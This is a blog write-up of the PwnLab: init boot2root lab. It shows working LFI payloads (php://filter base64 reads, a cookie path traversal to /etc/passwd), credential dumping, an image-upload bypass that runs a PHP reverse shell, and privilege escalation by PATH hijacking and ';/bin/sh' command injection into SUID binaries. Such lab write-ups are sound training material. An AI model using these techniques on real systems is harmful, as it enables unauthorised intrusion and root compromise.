---
layout: post
title: "Pwnlab: init"
date: 2018-08-25 17:01:13 -0400
comments: true
categories: [penetration testing, writeups]
keywords: pwnlab init, pentest lab, hacking lab, pwnlab, vulnhub
description: Pwnlab init writeup
---

Today's boot2root is called PwnLab: init and the goal is to read the flag in /root/flag.txt

<!-- more -->

``` 
Nmap scan report for 192.168.164.129
Host is up (0.00099s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          37397/udp  status
|_  100024  1          58026/tcp  status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, LongColumnFlag, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, LongPassword, Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ODBCClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: pKc2lJniDVf|]<Rg2bwQ
|_  Auth Plugin Name: 88
58026/tcp open  status  1 (RPC #100024)
```

The website is an intranet portal for uploading images, but we have to login first.

{% img center /images/pentest/pwnlab_init/web.jpg 'web server' 'intranet portal' %}

I ran Nikto on it but there were no interesting finds, except for the following line:

``` 
+ /config.php: PHP Config file may contain database IDs and passwords.
```

However, when I tried to read that file, all I got was a blank page. I've noticed that the URLs for the pages look like this: http://192.168.164.129/?page=login for the login page and http://192.168.164.129/?page=upload for the upload page. I tried some directory traversal and file inclusion techniques, thinking that this might be the way of reading the config.php file, but had no luck. However, as I was searching for a way on the internet, I came across this article on a [LFI method that uses PHP filters](https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/). The below command allows reading the source of PHP files by using the filter functionality to base64 encode the contents of the file before reading it: 

<code>url?page=php://filter/convert.base64-encode/resource=config</code>

This returned a base64 string that when decoded, gave me the MySQL credentials:

``` 
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

Now we can connect to that database:

``` 
mysql -u root -h 192.168.217.143
ERROR 1045 (28000): Access denied for user 'root'@'192.168.217.132' (using password: NO)
root@kali:~# mysql -u root -p -h 192.168.217.143
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 41
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> use Users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Users]>  
```

Let's see what we have here:

``` 
MySQL [Users]> show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.05 sec)
```

3 users with base64 encoded passwords!

``` 
kent / JWzXuBJJNy
mike / SIfdsTEn6I
kane / iSv5Ym2GRo
```

I logged in as kent and tried uploading a PHP reverse shell, but got an error stating that the file type is not allowed. Using the previous LFI method, let's take a look at the source code of the upload page:

{% codeblock lang:php %}  
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>
{% endcodeblock %}

We can see that the file will get uploaded to the /upload folder with an MD5 name and that it has to be an image file of the 4 allowed types, complete with a matching MIME type. To test it, I changed pentestmonkey's reverse shell extension to .gif and added the magic string at the beginning of the file (GIF98). Then I pushed the upload button and bingo! The shell has been successfully deployed at <code>upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</code>

My listener is prepared and all, but there is still the matter of how to execute the shell. For any possible hint, I've looked t the source code of the index page:

{% codeblock lang:php %} 
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html> 
{% endcodeblock %}

That cookie parameter looks vulnerable if we can include a file of our choosing. I tested it by replaying a request in Burp and using the following LFI for the cookie value:

``` 
Cookie: lang=../../../../etc/passwd
```

The response came back with the contents of the passwd file, so it worked! I did the same, this time setting the cookie to the path of the previously uploaded shell:

``` 
Cookie: lang=../upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif
```

And in our listener, we have a hit!

``` 
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 36356
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 11:08:31 up  2:34,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/sh');"
```

I've proceeded to switch through the 3 users for which I got the passwords earlier and see what can be done. Nothing interesting from kent, getting an authentication failure as mike, but in kane's home folder there's an interesting SUID binary called *msgmike* 

``` 
-rwsr-sr-x 1 mike mike 5.1K Mar 17  2016 msgmike
```

Trying to run it gives an error:

``` 
kane@pwnlab:~$ ./msgmike
./msgmike
cat: /home/mike/msg.txt: No such file or directory
```

Interesting, this calls cat, but not from an absolute path. So if we create a malicious binary called cat and add kane's home to the PATH variable, we should be able to run an arbitrary program with mike's privileges. 

``` 
kane@pwnlab:~$ echo "/bin/bash" > cat
echo "/bin/bash" > cat
kane@pwnlab:~$ chmod 777 cat
chmod 777 cat
```

Here we want to run bash as mike. Let's see how the PATH looks:

``` 
kane@pwnlab:~$ echo $PATH
echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Now let's add the current location to the PATH:

``` 
export PATH=.:$PATH
kane@pwnlab:~$ echo $PATH
echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:
```

Running the binary turns us into mike!

``` 
kane@pwnlab:~$ ./msgmike
./msgmike
mike@pwnlab:~$
```

In mike's home there is another SUID binary, this time owned by root. We can see where this is going..

``` 
-rwsr-sr-x 1 root root 5.3K Mar 17  2016 msg2root
mike@pwnlab:/home/mike$ ./msg2root
./msg2root
Message for root: pwn incoming
pwn incoming
pwn incoming
```

This binary takes an input and outputs it to the screen, while also appending it to a file in root's home (below line is taken from strings output)

``` 
/bin/echo %s >> /root/messages.txt
```

We can chain commands by passing a string for the echo function and then adding a second command with <code>;</code>:

``` 
./msg2root 
./msg2root 
Message for root: hey;/bin/sh
hey;/bin/sh
hey
# 
```

We're root now! Read the flag and game over:

``` 
# cat flag.txt
cat flag.txt
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'               
```

This was a nice challenge with the LFI twist! A new technique added to our repertoire, and another boot2root completed!

``` 
 ____________________________________
/ You're currently going through a   \
| difficult transition period called |
\ "Life."                            /
 ------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```












